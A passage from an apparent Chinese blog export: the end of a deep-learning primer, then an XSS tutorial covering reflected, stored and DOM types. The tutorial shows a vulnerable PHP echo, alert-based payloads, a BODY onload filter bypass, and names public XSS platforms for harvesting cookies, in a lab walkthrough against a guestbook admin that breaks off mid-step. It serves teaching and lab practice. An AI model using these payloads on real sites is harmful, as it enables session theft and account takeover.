<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1642158524521-fc44905d-8e7c-4195-817b-bc5234bab4e2.png" alt="img"></p>
<p>&emsp;&emsp;特别是<strong>随机森林</strong>（random forest）算法，它引入了一种健壮且实用的决策树学习方法，即首先构建许多决策树，然后将它们的输出集成在一起。随机森林适用于各种各样的问题——对于任何浅层的机器学习任务来说，它几乎总是第二好的算法。广受欢迎的机器学习竞赛网站Kaggle在2010年上线后，随机森林迅速成为平台上人们的最爱，直到2014年才被梯度提升机所取代。与随机森林类似，<strong>梯度提升机</strong>（gradientboosting machine）也是将弱预测模型（通常是决策树）集成的机器学习技术。它使用了<strong>梯度提升方法</strong>，通过迭代地训练新模型来专门解决之前模型的弱点，从而改进任何机器学习模型的效果。将梯度提升技术应用于决策树时，得到的模型与随机森林具有相似的性质，但在绝大多数情况下效果都比随机森林要好。它可能是目前处理非感知数据最好的算法之一（如果非要加个“之一”的话）。和深度学习一样，它也是Kaggle竞赛中最常用的技术之一。</p>
<h2 id="3、从数据中学习表示"><a href="#3、从数据中学习表示" class="headerlink" title="3、从数据中学习表示"></a>3、从数据中学习表示</h2><p>&emsp;&emsp;为了给出<strong>深度学习</strong>的定义并搞清楚深度学习与其他机器学习方法的区别，我们首先需要知道机器学习算法在<strong>做</strong>什么。前面说过，给定包含预期结果的示例，机器学习将会发现执行一项数据处理任务的规则。因此，我们需要以下三个要素来进行机器学习。</p>
<ol>
<li><strong>输入数据点</strong>。例如，你的任务是语音识别，那么这些数据点可能是记录人们说话的声音文件。如果你的任务是为图像添加标签，那么这些数据点可能是图像。</li>
<li><strong>预期输出的示例</strong>。对于语音识别任务来说，这些示例可能是人们根据声音文件整理生成的文本。对于图像标记任务来说，预期输出可能是“狗”“猫”之类的标签。</li>
<li><strong>衡量算法效果好坏的方法</strong>。这一衡量方法是为了计算算法的当前输出与预期输出的差距。衡量结果是一种反馈信号，用于调节算法的工作方式。<strong>这个调节步骤就是我们所说的学习。</strong></li>
</ol>
<p>&emsp;&emsp;机器学习模型将输入数据变换为有意义的输出，这是一个从已知的输入和输出示例中进行“学习”的过程。因此，机器学习和深度学习的核心问题在于<strong>有意义地变换数据</strong>，换句话说，在于学习输入数据的有用<strong>表示</strong>（representation）——这种表示可以让数据更接近预期输出。在进一步讨论之前，我们需要先回答一个问题：什么是表示？这一概念的核心在于以一种不同的方式来查看数据（即<strong>表征</strong>数据或将数据<strong>编码</strong>）。例如，彩色图像可以编码为RGB（红-绿-蓝）格式或HSV（色相-饱和度-明度）格式，这是对相同数据的两种不同表示。在处理某些任务时，使用某种表示可能会很困难，但换用另一种表示就会变得很简单。举个例子，对于“选择图像中所有红色像素”这个任务，使用RGB格式会更简单，而对于“降低图像饱和度”这个任务，使用HSV格式则更简单。机器学习模型都是为输入数据寻找合适的表示——对数据进行变换，使其更适合手头的任务（比如分类任务）。</p>
<p>&emsp;&emsp;我们来具体说明这一点。考虑x轴、y轴和在这个(x, y)坐标系中由坐标表示的一些点，如图所示。</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1642150688473-4f5aadf3-7fec-44a5-b556-1aa44336efd3.png" alt="img"></p>
<p>可以看到，图中有一些白点和一些黑点。假设我们想要开发一个算法，输入一个点的坐标(x, y)，就能够判断这个点是黑色还是白色。在这个例子中：</p>
<ol>
<li>输入是点的坐标；</li>
<li>预期输出是点的颜色；</li>
<li>衡量算法效果好坏的一种方法是，正确分类的点所占的百分比。</li>
</ol>
<p>这里我们需要的是一种新的数据表示，可以明确区分白点与黑点。可用的方法有很多，这里用的是坐标变换，如图所示。</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1642150769639-c8f9978f-0105-4845-94b2-2b2711d115f1.png" alt="img"></p>
<p>&emsp;&emsp;在这个新的坐标系中，点的坐标可以看作数据的一种新的表示。这种表示很棒！利用这种新的表示，用一条简单的规则就可以描述黑/白分类问题：“x&gt;0的是黑点”或“x&lt;0的是白点”。这种新的表示基本上解决了该分类问题。</p>
<p>&emsp;&emsp;在这个例子中，我们人为定义了坐标变换。但是，如果我们尝试系统性地搜索各种可能的坐标变换，并用正确分类的点所占百分比作为反馈信号，那么我们做的就是机器学习。机器学习中的<strong>学习</strong>指的是，寻找更好数据表示的自动搜索过程。</p>
<p>&emsp;&emsp;所有机器学习算法都包括自动寻找这样一种变换：这种变换可以根据任务将数据转化为更加有用的表示。这些操作可能是前面提到的坐标变换，也可能是线性投影（可能会破坏信息）、平移、非线性操作（比如“选择所有x&gt;0的点”），等等。机器学习算法在寻找这些变换时通常没有什么创造性，而仅仅是遍历一组预先定义好的操作，这组操作叫作<strong>假设空间</strong>（hypothesis space）。</p>
<p>&emsp;&emsp;这就是机器学习的技术定义：在预先定义好的可能性空间中，利用反馈信号的指引来寻找输入数据的有用表示。这个简单的想法可以解决相当多的智能任务，从语音识别到自动驾驶都能解决。现在你理解了学习的含义，下面我们来看一下深度学习的特殊之处。</p>
<h2 id="4、深度学习之“深度”"><a href="#4、深度学习之“深度”" class="headerlink" title="4、深度学习之“深度”"></a>4、深度学习之“深度”</h2><p>&emsp;&emsp;深度学习是机器学习的一个分支领域：它是从数据中学习表示的一种新方法，强调从连续的<strong>层</strong>（layer）中进行学习，这些层对应于越来越有意义的表示。“深度学习”中的“深度”指的并不是利用这种方法所获取的更深层次的理解，而是指一系列连续的表示层。数据模型中包含多少层，这被称为模型的<strong>深度</strong>（depth）。这一领域的其他名称包括<strong>分层表示学习</strong>（layered representationslearning）和<strong>层级表示学习</strong>（hierarchicalrepresentations learning）。现代深度学习通常包含数十个甚至上百个连续的表示层，这些表示层全都是从训练数据中自动学习的。与此相反，其他机器学习方法的重点往往是仅仅学习一两层的数据表示，因此有时也被称为<strong>浅层学习</strong>（shallowlearning）。</p>
<p>&emsp;&emsp;在深度学习中，这些分层表示几乎总是通过叫作神经网络（neural network）的模型来学习得到的。神经网络的结构是逐层堆叠。神经网络这一术语来自于神经生物学，然而，虽然深度学习的一些核心概念是从人们对大脑的理解中汲取部分灵感而形成的，但深度学习模型不是大脑模型。没有证据表明大脑的学习机制与现代深度学习模型所使用的相同。你可能会读到一些流行科学的文章，宣称深度学习的工作原理与大脑相似或者是根据大脑的工作原理进行建模的，但事实并非如此。对于这一领域的新人来说，如果认为深度学习与神经生物学存在任何关系，那将使人困惑，只会起到反作用。你无须那种“就像我们的头脑一样”的神秘包装，最好也忘掉读过的深度学习与生物学之间的假想联系。就我们的目的而言，深度学习是从数据中学习表示的一种数学框架。</p>
<p>&emsp;&emsp;深度学习算法学到的表示是什么样的？我们来看一个多层网络（见图）如何对数字图像进行变换，以便识别图像中所包含的数字。</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1642151850866-015eebf8-5f18-4ae1-bf4f-e6cc5b549649.png" alt="img"></p>
<p>&emsp;&emsp;如下图所示，这个网络将数字图像转换成与原始图像差别越来越大的表示，而其中关于最终结果的信息却越来越丰富。你可以将深度网络看作多级信息蒸馏操作：信息穿过连续的过滤器，其<strong>纯度</strong>越来越高（即对任务的帮助越来越大）。</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1642151920619-49ed67b6-8b86-41aa-9fc4-f55effbdc9ef.png" alt="img"></p>
<h2 id="5、用三张图理解深度学习的工作原理"><a href="#5、用三张图理解深度学习的工作原理" class="headerlink" title="5、用三张图理解深度学习的工作原理"></a>5、用三张图理解深度学习的工作原理</h2><p>&emsp;&emsp;现在你已经知道，机器学习是将输入（比如图像）映射到目标（比如标签“猫”），这一过程是通过观察许多输入和目标的示例来完成的。你还知道，深度神经网络通过一系列简单的数据变换（层）来实现这种输入到目标的映射，而这些数据变换都是通过观察示例学习到的。下面来具体看一下这种学习过程是如何发生的。</p>
<p>&emsp;&emsp;神经网络中每层对输入数据所做的具体操作保存在该层的<strong>权重</strong>（weight）中，其本质是一串数字。用术语来说，每层实现的变换由其权重来<strong>参数化</strong>（parameterize，见下图）。权重有时也被称为该层的<strong>参数</strong>（parameter）。在这种语境下，<strong>学习</strong>的意思是为神经网络的所有层找到一组权重值，使得该网络能够将每个示例输入与其目标正确地一一对应。但重点来了：一个深度神经网络可能包含数千万个参数。找到所有参数的正确取值可能是一项非常艰巨的任务，特别是考虑到修改某个参数值将会影响其他所有参数的行为。</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1642152088067-9d026ca7-e739-4efc-a60c-fa85bdced4c4.png" alt="img"></p>
<p>&emsp;&emsp;想要控制一件事物，首先需要能够观察它。想要控制神经网络的输出，就需要能够衡量该输出与预期值之间的距离。这是神经网络<strong>损失函数</strong>（lossfunction）的任务，该函数也叫<strong>目标函数</strong>（objective function）。损失函数的输入是网络预测值与真实目标值（即你希望网络输出的结果），然后计算一个距离值，衡量该网络在这个示例上的效果好坏（见图）。</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1642154784787-60b4b18c-32e0-4921-9ac1-026874f7f59c.png" alt="img"></p>
<p>&emsp;&emsp;深度学习的基本技巧是利用这个距离值作为反馈信号来对权重值进行微调，以降低当前示例对应的损失值（见下图）。这种调节由<strong>优化器</strong>（optimizer）来完成，它实现了所谓的<strong>反向传播</strong>（backpropagation）算法，这是深度学习的核心算法。下一章中会详细地解释反向传播的工作原理。</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1642154826026-a8d2973c-e3f8-4e3a-a32a-4fe90f208caa.png" alt="img"></p>
<p>&emsp;&emsp;一开始对神经网络的权重随机赋值，因此网络只是实现了一系列随机变换。其输出结果自然也和理想值相去甚远，相应地，损失值也很高。但随着网络处理的示例越来越多，权重值也在向正确的方向逐步微调，损失值也逐渐降低。这就是<strong>训练循环</strong>（training loop），将这种循环重复足够多的次数（通常对数千个示例进行数十次迭代），得到的权重值可以使损失函数最小。具有最小损失的网络，其输出值与目标值尽可能地接近，这就是训练好的网络。再次强调，这是一个简单的机制，一旦具有足够大的规模，将会产生魔法般的效果。</p>
]]></content>
      <categories>
        <category>深度学习</category>
      </categories>
      <tags>
        <tag>深度学习</tag>
      </tags>
  </entry>
  <entry>
    <title>跨站脚本攻击XSS</title>
    <url>/post/e0b257ee.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1623812807110-92a87dfe-1e4e-4edf-9eec-37b470ff1e34.png" alt="img"></p>
<h1 id="一、XSS跨站漏洞"><a href="#一、XSS跨站漏洞" class="headerlink" title="一、XSS跨站漏洞"></a>一、XSS跨站漏洞</h1><h3 id="（1）XSS简介"><a href="#（1）XSS简介" class="headerlink" title="（1）XSS简介"></a>（1）XSS简介</h3><p>&emsp;&emsp;网站中包含大量的动态内容以提高用户体验，比过去要复杂得多。所谓动态内容，就是根据用户环境和需要，Web应用程序能够输出相应的内容。动态站点会受到一种名为“跨站脚本攻击”（Cross Site Scripting，安全专家们通常将其缩写成XSS,原本应当是css，但为了和层叠样式表（Cascading Style Sheet,CSS）有所区分，故称XSS）的威胁，而静态站点则完全不受其影响。恶意攻击者会在 Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。</p>
<p>&emsp;&emsp;跨站脚本攻击是一种针对网站应用程序的安全漏洞攻击技术，<strong>是代码注入的一种</strong>。它允许恶意用户将代码注入网页，其他用户在浏览网页时会受到影响，恶意用户利用xss 代码攻击成功后，可能得到很高的权限、私密网页内容、会话和cookie等各种内容</p>
<p>&emsp;&emsp;攻击者利用XSS漏洞旁路掉访问控制——例如同源策略(same origin policy)。这种类型的漏洞由于被黑客用来编写危害性更大的网络钓鱼(Phishing)攻击而变得广为人知。对于跨站脚本攻击，黑客界共识是：跨站脚本攻击是新型的“缓冲区溢出攻击”，而JavaScript是新型的“ShellCode”。</p>
<p>&emsp;&emsp;xss漏洞通常是通过php的输出函数将javascript代码输出到html页面中，通过用户本地浏览器执行的，所以xss漏洞关键就是<strong>寻找参数未过滤的输出函数</strong>。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$xss</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;x&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$xss</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1642341981620-921b4149-c445-4553-be94-700b74a88fe7.png" alt="img"></p>
<h3 id="（2）产生层面"><a href="#（2）产生层面" class="headerlink" title="（2）产生层面"></a>（2）产生层面</h3><p>&emsp;&emsp;产生层面一般都是在前端，JavaScript代码能干什么，执行之后就会达到相应的效果</p>
<h3 id="（3）函数类"><a href="#（3）函数类" class="headerlink" title="（3）函数类"></a>（3）函数类</h3><p>&emsp;&emsp;比如说php中的脚本的输出函数</p>
<p>&emsp;&emsp;常见的输出函数有：<code>print</code>、<code>print_r</code>、<code>echo</code>、<code>printf</code>、<code>sprintf</code>、<code>die</code>、<code>var_dump</code>、<code>var_export</code></p>
<h3 id="（4）危害影响"><a href="#（4）危害影响" class="headerlink" title="（4）危害影响"></a>（4）危害影响</h3><ul>
<li><p>盗取各类用户帐号，如机器登录帐号、用户网银帐号、各类管理员帐号</p>
</li>
<li><p>控制企业数据，包括读取、篡改、添加、删除企业敏感数据的能力</p>
</li>
<li><p>盗窃企业重要的具有商业价值的资料</p>
</li>
<li><p>非法转账</p>
</li>
<li><p>强制发送电子邮件</p>
</li>
<li><p>网站挂马</p>
</li>
<li><p>控制受害者机器向其它网站发起攻击</p>
</li>
</ul>
<p>&emsp;&emsp;其实归根结底，XSS的攻击方式就是想办法“教唆”用户的浏览器去执行一些这个网页中原本不存在的前端代码。可问题在于尽管一个信息框突然弹出来并不怎么友好，但也不至于会造成什么真实伤害啊。的确如此，但要说明的是，这里拿信息框说事仅仅是为了举个栗子，真正的黑客攻击在XSS中除非恶作剧，不然是不会在恶意植入代码中写上<code>alert(&quot;say something&quot;)</code>的。在真正的应用中，XSS攻击可以干的事情还有很多，这里举两个例子。</p>
<ol>
<li><p><strong>窃取网页浏览中的cookie值</strong>。在网页浏览中我们常常涉及到用户登录，登录完毕之后服务端会返回一个cookie值。这个cookie值相当于一个令牌，拿着这张令牌就等同于证明了你是某个用户。如果你的cookie值被窃取，那么攻击者很可能能够直接利用你的这张令牌不用密码就登录你的账户。如果想要通过script脚本获得当前页面的cookie值，通常会用到cookie。试想下如果像空间说说中能够写入xss攻击语句，那岂不是看了你说说的人的号你都可以登录（不过貌似QQ的cookie有其他验证措施保证同一cookie不能被滥用）</p>
</li>
<li><p><strong>劫持流量实现恶意跳转</strong>。这个很简单，就是在网页中想办法插入一句像这样的语句： <code>&lt;script&gt;window.location.href=&quot;http://www.baidu.com&quot;;&lt;/script&gt;</code>那么所访问的网站就会被跳转到百度的首页。早在2011年新浪就曾爆出过严重的xss漏洞，导致大量用户自动关注某个微博号并自动转发某条微博。具体各位可以自行百度。</p>
</li>
</ol>
<h3 id="（5）浏览器内核版本"><a href="#（5）浏览器内核版本" class="headerlink" title="（5）浏览器内核版本"></a>（5）浏览器内核版本</h3><p>&emsp;&emsp;利用XSS需要浏览器版本和内核没有过滤XSS攻击（比如用谷歌Edge火狐等打开可以成功，但是IE却会拦截）</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1642342841941-5a0cad66-73d2-4e85-b2bd-38cb37cbdebd.png" alt="img"></p>
<h3 id="（6）常出现场景"><a href="#（6）常出现场景" class="headerlink" title="（6）常出现场景"></a>（6）常出现场景</h3><p>&emsp;&emsp;文章发表、评论、留言、注册资料的地方、修改资料的地方等</p>
<h1 id="二、XSS攻击的分类"><a href="#二、XSS攻击的分类" class="headerlink" title="二、XSS攻击的分类"></a>二、XSS攻击的分类</h1><p>&emsp;&emsp;XSS攻击分成两类，一类是来自内部的攻击，另一类则是来自外部的攻击</p>
<h3 id="（1）来自内部的攻击"><a href="#（1）来自内部的攻击" class="headerlink" title="（1）来自内部的攻击"></a>（1）来自内部的攻击</h3><p>&emsp;&emsp;主要指的是利用程序自身的漏洞，构造跨站语句，如:dvbbs的showerror.asp存在的跨站漏洞。</p>
<h3 id="（2）来自外部的攻击"><a href="#（2）来自外部的攻击" class="headerlink" title="（2）来自外部的攻击"></a>（2）来自外部的攻击</h3><p>&emsp;&emsp;主要指的自己构造XSS跨站漏洞网页或者寻找非目标机以外的有跨站漏洞的网页。如当我们要渗透一个站点，我们自己构造一个有跨站漏洞的网页，然后构造跨站语句，通过结合其它技术，如社会工程学等，欺骗目标服务器的管理员打开。</p>
<h1 id="三、XSS的分类"><a href="#三、XSS的分类" class="headerlink" title="三、XSS的分类"></a>三、XSS的分类</h1><h2 id="1、反射型-非持久化"><a href="#1、反射型-非持久化" class="headerlink" title="1、反射型(非持久化)"></a>1、反射型(非持久化)</h2><h3 id="（1）原理"><a href="#（1）原理" class="headerlink" title="（1）原理"></a>（1）原理</h3><p>&emsp;&emsp;反射型xss又称非持久型xss，是目前最普遍的类型，这种攻击方式往往具有一次性。发出请求时，XSS代码出现在URL中，作为输入提交到服务器端，服务器端解析后响应，XSS代码随响应内容一起传回给浏览器，最后浏览器解析执行XSS代码。这个过程像一次反射，所以称反射型XSS。</p>
<h3 id="（2）攻击方式"><a href="#（2）攻击方式" class="headerlink" title="（2）攻击方式"></a>（2）攻击方式</h3><p>&emsp;&emsp;攻击者通过电子邮件等方式将包含xss代码的恶意链接发送给目标用户。当目标用户访问该链接时，服务器接受该用户的请求并进行处理，然后服务器把带有xss代码的数据发送给目标用户的浏览器，浏览器解析这段带有xss代码的恶意脚本后就会触发xss漏洞</p>
<h3 id="（3）判断是否存在反射型xss漏洞并利用"><a href="#（3）判断是否存在反射型xss漏洞并利用" class="headerlink" title="（3）判断是否存在反射型xss漏洞并利用"></a>（3）判断是否存在反射型xss漏洞并利用</h3><h4 id="①-判断有没有过滤一些特殊的字符"><a href="#①-判断有没有过滤一些特殊的字符" class="headerlink" title="① 判断有没有过滤一些特殊的字符"></a>① 判断有没有过滤一些特殊的字符</h4><p>&emsp;&emsp;比如对比输出的字符和输出的字符，可以看到有些字符被过滤了    </p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1617367672003-13b2dba8-1f1c-4dbb-969b-77beeea4fa05.png" alt="img"></p>
<h4 id="②-注入代码"><a href="#②-注入代码" class="headerlink" title="② 注入代码"></a>② 注入代码</h4><p>&emsp;&emsp;下面是大概的原理</p>
<p>&emsp;&emsp;假如我输入的是1，提交后，点击查看网页源代码</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1617368119960-7de6f842-1d70-4a6e-9786-0ffb47fb6fae.png" alt="img"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1617368167938-09da8f29-4386-4d14-9d65-8669c256ec8b.png" alt="img"></p>
<h4 id="③-插入代码"><a href="#③-插入代码" class="headerlink" title="③ 插入代码"></a>③ 插入代码</h4><p>&emsp;&emsp;<code>&quot;&gt;&lt;img src=1 onerror=&quot;alert(/xss/)&quot;/&gt;</code> #如果读取图片失败，则用alert显示相关信息<img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1617367857065-1ee4c750-de1d-4ad1-a639-e502786baf27.png" alt="img"></p>
<p>&emsp;&emsp;显示了信息，则说明存在xss注入<img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1617367866441-a057b6a3-93ac-4a12-b6fa-322c647b0528.png" alt="img"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1617368347307-3a839a33-4f11-4f8f-92c2-a788393571ef.png" alt="img"></p>
<p>&emsp;&emsp;可以对比看到，通过前面的闭合以及后面的代码插入，读取不到图片，因此触发了alert弹窗，显示了括号内的内容即/xss/</p>
<h4 id="④-利用xss漏洞"><a href="#④-利用xss漏洞" class="headerlink" title="④ 利用xss漏洞"></a>④ 利用xss漏洞</h4><p>&emsp;&emsp;将刚刚成功注入代码并能触发xss的网址通过电子邮件等方式发送给对方的手中，如果结合xss平台，对方点击了链接，就能得到对方的cookie等信息</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1617368869268-95db2fed-00e3-49d6-a9ee-f104017116fa.png" alt="img"></p>
<h2 id="2、存储型-持久化"><a href="#2、存储型-持久化" class="headerlink" title="2、存储型(持久化)"></a>2、存储型(持久化)</h2><p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1642344755944-309efc16-b5fc-4b0e-ae0e-2b1bdcd6ca64.png" alt="img"></p>
<h3 id="（1）原理-1"><a href="#（1）原理-1" class="headerlink" title="（1）原理"></a>（1）原理</h3><p>&emsp;&emsp;存储型XSS和反射型XSS的差别仅在于，提交的代码会存储在服务器端（数据库、内存、文件系统等），下次请求目标页面时不用再提交XSS代码。最典型的例子就是留言板XSS，用户提交一条包含XSS代码的留言存储到数据库，目标用户查看留言板时，那些留言就会从数据库中加载出来并显示，于是触发了XSS攻击</p>
<h3 id="（2）攻击方式-1"><a href="#（2）攻击方式-1" class="headerlink" title="（2）攻击方式"></a>（2）攻击方式</h3><p>&emsp;&emsp;这种攻击多见于论坛、博客和留言板中，攻击者在发帖的过程中，将恶意脚本连同正常的信息一起注入帖子的内容中。随着帖子被服务器存储下来，恶意脚本也永久的存放在服务器的后端存储器中。当其他用户浏览这个被注入了恶意脚本的帖子时，恶意脚本会在它们的浏览器中得到执行</p>
<h3 id="（3）payload"><a href="#（3）payload" class="headerlink" title="（3）payload"></a>（3）payload</h3><p><code>&lt;img src=&quot;1&quot; onerror=&quot;alert(/xss/)&quot;/&gt;</code></p>
<p>注入后重新刷新发现直接回显注入的东西，说明是存储型xss</p>
<h2 id="3、DOM型"><a href="#3、DOM型" class="headerlink" title="3、DOM型"></a>3、DOM型</h2><p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1629707398023-84cc1277-38d6-495a-96e6-e6a521e12fc3.png" alt="img"></p>
<h3 id="（1）原理-2"><a href="#（1）原理-2" class="headerlink" title="（1）原理"></a>（1）原理</h3><p>&emsp;&emsp;文档对象模型Document Object Model（DOM）是一个与平台、编程语言不相干的接口，允许程序或脚本动态地访问和更新文档内容、结构和样式，处理后的结果会成为展示页面的一部分  </p>
<p>&emsp;&emsp;DOM型xss其实是一种特殊类型的反射型xss，也被称作<strong>本地跨站</strong>，它是基于DOM文档对象模型的一种漏洞。<strong>DOM XSS和反射型XSS、存储型XSS的区别在于DOM XSS代码并不需要服务器参与，出发XSS靠的是浏览器的DOM解析，完全是客户端的事情</strong></p>
<p>&emsp;&emsp;DOM中有很多对象，其中一些对象可以被用户所操纵，如url，location等。客户端的脚本程序可以通过DOM来动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而是从客户端取得DOM中的数据后并在本地执行，因此仅从服务器端是没有办法防御DOM型XSS漏洞的，如若DOM中的数据没有经过严格的验证，便会产生基于DOM的XSS漏洞。</p>
<p>&emsp;&emsp;基于DOM的XSS是反射的特例，其中JavaScript隐藏在URL中，并在其呈现时由页面中的JavaScript取出，而不是在提供服务时嵌入到页面中。这可以使其比其他攻击更隐蔽，并且监控页面正文的WAF或其他防护检测不出恶意内容。</p>
<h3 id="（2）攻击方式-2"><a href="#（2）攻击方式-2" class="headerlink" title="（2）攻击方式"></a>（2）攻击方式</h3><p>&emsp;&emsp;用户请求一个经过专门设计的URL，它由攻击者提交，而且其中包含xss代码。服务器的响应不会以任何的形式包含攻击者的脚本，当用户的浏览器处理这个响应时，DOM对象就会处理xss代码，导致存在xss漏洞</p>
<h3 id="（3）payload-1"><a href="#（3）payload-1" class="headerlink" title="（3）payload"></a>（3）payload</h3><ul>
<li><code>&lt;img src=1 onerror=&quot;alert(/xss/)&quot;/&gt;</code></li>
</ul>
<h1 id="四、XSS攻击的途径"><a href="#四、XSS攻击的途径" class="headerlink" title="四、XSS攻击的途径"></a>四、XSS攻击的途径</h1><p>XSS攻击方法只是利用HTML的属性做各种尝试，找出注入的方法。现在对三种XSS攻击的主要方式进行分析。  </p>
<ol>
<li><p>第一种：对普通的用户输入，页面原样输出，攻击者通过对JSCODE的伪装，经过某些特定的操作就会跳出一个木马界面，从而取得登录用户的Cookie.  </p>
</li>
<li><p>第二种：在代码区内存在有用户输入的内容  </p>
</li>
<li><p>第三种：允许用户输入HTML标签的页面，用户可以提交一些自定义的HTML代码。  </p>
</li>
</ol>
<h1 id="五、靶场实战"><a href="#五、靶场实战" class="headerlink" title="五、靶场实战"></a>五、靶场实战</h1><h2 id="1、PHP开源多功能留言板"><a href="#1、PHP开源多功能留言板" class="headerlink" title="1、PHP开源多功能留言板"></a>1、PHP开源多功能留言板</h2><h3 id="（1）搭建靶场"><a href="#（1）搭建靶场" class="headerlink" title="（1）搭建靶场"></a>（1）搭建靶场</h3><p>PHP开源多功能留言板下载地址：<a href="https://down.chinaz.com/soft/37581.htm">https://down.chinaz.com/soft/37581.htm</a> ，按照教程安装即可</p>
<h3 id="（2）XSS平台"><a href="#（2）XSS平台" class="headerlink" title="（2）XSS平台"></a>（2）XSS平台</h3><ul>
<li><p>网址1：<a href="https://xss.pt/xss.php">https://xss.pt/xss.php</a></p>
</li>
<li><p>网址2：<a href="http://xss.fbisb.com/xss.php">http://xss.fbisb.com/xss.php</a></p>
</li>
<li><p>网址3：<a href="https://xss8.cc/login/">https://xss8.cc/login/</a></p>
</li>
<li><p>网址4：<a href="https://xsshs.cn/xss.php?do=login">https://xsshs.cn/xss.php?do=login</a></p>
</li>
</ul>
<h3 id="（3）进行攻击"><a href="#（3）进行攻击" class="headerlink" title="（3）进行攻击"></a>（3）进行攻击</h3><h4 id="①-初次尝试"><a href="#①-初次尝试" class="headerlink" title="① 初次尝试"></a>① 初次尝试</h4><p>尝试用简单的JS代码进行XSS攻击</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1642404918490-71d694cc-f960-4f34-8cbf-c5616df235cc.png" alt="img"></p>
<p>存在JS过滤</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1642404929155-920e302c-1459-4596-b886-ad7188f5a561.png" alt="img"></p>
<h4 id="②-绕过-lt-script-gt-检测"><a href="#②-绕过-lt-script-gt-检测" class="headerlink" title="② 绕过&lt;script&gt;检测"></a>② 绕过<code>&lt;script&gt;</code>检测</h4><p>使用以下语句绕过<code>&lt;script &gt;</code>过滤：<code>&lt;BODY onload=&quot;alert(&#39;XSS&#39;)&quot;&gt;</code></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1642405435917-686249c9-c463-4db8-bc4f-e3f5a861413f.png" alt="img"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1642405450698-9e6ec365-8df2-4485-ad4c-c7bcedcb0898.png" alt="img"></p>
<p>成功弹出弹窗</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1642405475988-f071dc12-017b-4358-944e-b02923920087.png" alt="img"></p>
<p>管理员后台查看也会弹出弹窗</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1642405506341-7506bfce-c447-47fc-963c-1e13efd0d378.png" alt="img"></p>
<p>而弹出弹窗的原因就是这句JS代码嵌入到了代码中</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1642405897104-7a8492d6-0f51-4e43-b86b-f1ce645624a0.png" alt="img"></p>
<h4 id="③-利用XSS平台获取cookie"><a href="#③-利用XSS平台获取cookie" class="headerlink" title="③ 利用XSS平台获取cookie"></a>③ 利用XSS平台获取cookie</h4><p>此时利用XSS平台，启用默认模块，因为这个留言板会过滤<code>&lt;script&gt;</code>标签，因此我选择使用img标签进行XSS攻击</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1642409499063-ea3d3fac-73e7-414d-92c4-be88c250eded.png" alt="img"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1642586508015-19995ba6-3397-48b7-845f-cadb954957df.png" alt="img"></p>
<p>发送payload成功</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1642584792036-5bada630-3c06-4f4b-9920-726fc7d40a90.png" alt="img"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1642406011774-d609f930-1235-485d-a54f-37396924a974.png" alt="img"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1642584973661-11be33f6-2ccd-4c45-84b2-2b223ed87b92.png" alt="img"></p>
<p>管理员到后台查看留言</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1642584952518-40c0c2d5-9a52-4635-9d34-bcf50b78830c.png" alt="img"></p>
<p>此时XSS平台就有记录了</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1642586589851-320fd40a-6db3-4b92-a2df-062b564453c1.png" alt="img"></p>
<h4 id="④-使用firebug登录后台"><a href="#④-使用firebug登录后台" class="headerlink" title="④ 使用firebug登录后台"></a>④ 使用firebug登录后台</h4><p>获取到访问的URL：</p>
